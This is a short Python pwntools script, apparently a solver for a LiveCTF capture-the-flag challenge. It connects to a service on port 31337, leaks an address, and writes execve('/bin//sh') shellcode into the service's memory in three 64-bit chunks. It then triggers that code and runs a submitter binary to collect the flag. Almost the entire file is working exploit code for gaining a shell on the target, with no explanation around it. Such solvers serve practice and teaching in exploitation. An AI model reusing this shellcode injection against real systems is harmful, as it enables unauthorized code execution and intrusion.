#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

a,b,c=struct.unpack("<3Q", b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05")

def _(x,y=0,z=0,lol=1):
    io.sendline(hex(x)[2:])
    io.sendline(hex(y)[2:])
    io.sendline(hex(z)[2:])
    io.recvuntil('returned ')
    res = io.recvline()
    io.sendline(str(lol))
    return int(res, 16)

io = remote(HOST, int(PORT))
rip = _(3, 0x80, 0)
print(hex(rip))
_(5, rip, a)
_(5, rip+0x08, b)
_(5, rip+0x10, c)
_(7,0,0,0)
#s.sendline("./submitter")
io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
print(flag)
